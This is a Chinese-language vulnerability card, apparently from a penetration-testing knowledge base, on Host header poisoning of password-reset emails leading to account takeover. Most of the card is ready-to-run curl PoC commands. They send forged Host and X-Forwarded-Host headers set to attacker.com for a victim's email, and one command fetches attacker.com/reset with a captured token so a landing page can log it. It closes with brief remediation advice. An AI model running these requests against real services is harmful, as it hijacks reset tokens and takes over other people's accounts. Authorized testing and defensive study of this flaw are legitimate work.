---
title: Host 头投毒（密码重置链接被劫持 → 任意账号接管）
cve: 无（实现缺陷）
severity: critical
cvss: 9.1
product: 自研找回密码/邀请链接（用 Host 拼 URL）
versions: 任意
ports: 80, 443
keywords: host, 头, 投毒, 密码重置, 链接, 劫持
entry: POST /api/user/findpwd 的 Host / X-Forwarded-Host
verified: false
sources: 公开资料整理（实现缺陷类）
---

## 指纹

- 找回密码/邀请/支付回调的邮件里 URL 与请求 Host 一致；
- 反代存在且应用读取 `X-Forwarded-Host`。

## 前置条件

- 邮件/短信里的链接由服务端按 Host 拼接；攻击者能触发发送。

## PoC

```bash
# 1) 换 Host 触发重置，看邮件里链接域名
curl -s -X POST 'https://target/api/user/findpwd' \
  -H 'Host: attacker.com' -H 'Content-Type: application/json' \
  -d '{"email":"victim@corp.com"}'

# 2) 反代场景用 XFH
curl -s -X POST 'https://target/api/user/findpwd' \
  -H 'X-Forwarded-Host: attacker.com' -d '{"email":"victim@corp.com"}'
# 判定：收到邮件里链接是 https://attacker.com/reset?token=... = 命中

# 3) 双 Host / 绝对 URI 变体
curl -s 'https://target/api/user/findpwd' -H 'Host: attacker.com:443'
```

```bash
# 4) 用劫持到的 token 改密（需受害者点链接，或用你自己的账号验证链路）
curl -s 'https://attacker.com/reset?token=<token>'   # 落地页把 token 记录
```

## 利用步骤

1. 先用自己的账号验证链路（收自己邮件）；
2. 换 Host/XFH 再发一次，对比邮件里的域名；
3. 命中即“可劫持任意用户重置链接”；
4. 证据：两次请求 + 两封邮件的链接对比（token 打码）。

## 修复与缓解

- 站点 URL 走配置白名单，不用请求 Host；校验 Host 合法值；重置 token 绑定用户。

## 参考

- OWASP Host Header 攻击；CWE-644。
